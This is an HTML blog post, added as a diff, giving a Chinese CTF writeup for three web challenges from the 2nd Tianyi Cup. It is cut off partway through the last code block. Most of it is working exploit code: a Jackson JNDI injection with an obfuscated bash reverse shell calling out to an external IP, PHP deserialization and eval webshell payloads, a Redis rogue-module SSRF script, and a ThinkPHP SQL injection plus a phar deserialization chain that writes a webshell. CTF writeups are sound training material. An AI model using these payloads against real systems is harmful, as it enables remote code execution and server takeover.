@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>第二届天翼杯writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup">
+  
+
+  
+    <meta name="description" content="web题目writeup">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">第二届天翼杯writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/">
+      第二届天翼杯writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年9月23日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：1.6k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：8分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/" class="leancloud_visitors" data-flag-title="第二届天翼杯writeup">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>web题目writeup</p>
+<a id="more"></a>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h3><p>原题</p>
+<p>扫目录发现/json 301跳转 shiro权限绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;;&#x2F;json</span><br></pre></td></tr></table></figure>
+
+<p>jndi注入</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923101913267.png" alt="image-20210923101913267"></p>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="attr">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://121.4.124.62:9000/calc&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>服务端起ysomap 工具使用：<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysomap">https://github.com/wh1t3p1g/ysomap</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit LDAPLocalChainListener</span><br><span class="line"><span class="built_in">set</span> lport 9000</span><br><span class="line">use payload  CommonsCollections8</span><br><span class="line">use bullet TransformerBullet</span><br><span class="line"><span class="built_in">set</span> version 3</span><br><span class="line"><span class="built_in">set</span> args <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNC4xMjQuNjIvOTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>得到shell</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923102040422.png" alt="image-20210923102040422"></p>
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dVrmI2oQKhMzuyc7O8GCa5enHifB9UYD&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezeval"><a href="#ezeval" class="headerlink" title="ezeval"></a>ezeval</h3><p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// function __call($method,$args)&#123;</span></span><br><span class="line">    <span class="comment">//     eval($this-&gt;code);</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = serialize(<span class="keyword">new</span> B);</span><br><span class="line"><span class="comment">// echo urlencode($s);</span></span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line">$s = <span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// you_cannot_guess_it</span></span><br></pre></td></tr></table></figure>
+
+<p>__wakeup绕过 数字改大点 小写绕过 .config.php.swp里有</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923102501852.png" alt="image-20210923102501852"></p>
+<p>探测下发现存在6379端口 猜测打redis主从复制rce 直接将exp.so传到/tmp</p>
+<p>使用这个：<a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
+<p>so在这：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = pfsockopen(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, $errno, $errstr, <span class="number">10</span>);</span><br><span class="line">$in = urldecode(urldecode(<span class="string">&quot;%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252419%250D%250Ayou_cannot_guess_it%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A/tmp/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A/tmp/exp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252412%250D%250Acat%2524%257BIFS%257D/f%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A&quot;</span>));</span><br><span class="line">fputs($fp, $in);</span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923120233309.png" alt="image-20210923120233309"></p>
+<h3 id="eztp"><a href="#eztp" class="headerlink" title="eztp"></a>eztp</h3><p>全局搜索think_vserion 可以看到是5.0.10</p>
+<p>该版本刚好有个sql注入漏洞 详情参考：<a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54.md</a></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]&#x3D;not like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;) union select 1,123#&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923182554159.png" alt="image-20210923182554159"></p>
+<p>在admin模块里有</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923182632544.png" alt="image-20210923182632544"></p>
+<p>而且有上传 明显phar反序列化 尝试公开的链子 发下不行</p>
+<p>调试下 发现根本原因是toJson方法变了</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923182832783.png" alt="image-20210923182832783"></p>
+<p>getAttr方法里调用了</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923183006840.png" alt="image-20210923183006840"></p>
+<p>getRelationData里面又调用了</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923183026626.png" alt="image-20210923183026626"></p>
+<p>直接让它来到：thinkphp/library/think/model/relation/HasOne.php#getRelation</p>
+<p>下面这个调用就满足条件 可以参数可控的调用任意类的__call方法了 其实也不需要可控参数 只要保证参数是字符串就行</p>
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923183122582.png" alt="image-20210923183122582"></p>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span>;</span><br><span class="line">        <span class="keyword">protected</span> $error;</span><br><span class="line">        <span class="keyword">public</span> $parent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $query;</span><br><span class="line">        <span class="keyword">protected</span> $selfRelation;</span><br><span class="line">        <span class="keyword">protected</span> $parent;</span><br><span class="line">        <span class="keyword">protected</span> $foreignKey;</span><br><span class="line">        <span class="comment">// 关联表主键</span></span><br><span class="line">        <span class="keyword">protected</span> $localKey;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = [<span class="string">&#x27;mb&#x27;</span>=&gt;<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>;</span><br><span class="line">        <span class="keyword">protected</span> $tag;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>, </span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOyAgPz4/../../../../../../../../var/www/html/public/uploads/s.php&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $styles;</span><br><span class="line">        <span class="keyword">private</span> $handle;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>\<span class="title">Relation</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $bindAttr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span 